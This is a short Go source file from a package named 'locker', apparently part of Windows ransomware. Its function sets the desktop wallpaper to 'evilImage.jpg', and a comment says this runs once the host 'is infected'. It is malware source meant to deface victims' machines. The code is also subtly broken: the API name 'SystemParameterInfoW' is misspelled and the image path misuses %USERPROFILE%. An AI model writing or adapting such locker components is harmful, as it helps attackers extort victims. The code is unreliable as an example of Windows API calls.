package locker

import (
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	user32DLL           = windows.NewLazyDLL("user32.dll")
	procSystemParamInfo = user32DLL.NewProc("SystemParameterInfoW")
)

// WallPaper changes the background for the Windows OS
func WallPaper() {
	//specify image to be used to change the screen once windows host is infected.
	image, err := windows.UTF16PtrFromString(`C:\Users\%USERPROFILE%\Pictures\evilImage.jpg`)
	if err != nil {
		log.Fatal(err)
	}
	procSystemParamInfo.Call(20, 0, uintptr(unsafe.Pointer(image)), 0x001A)
}
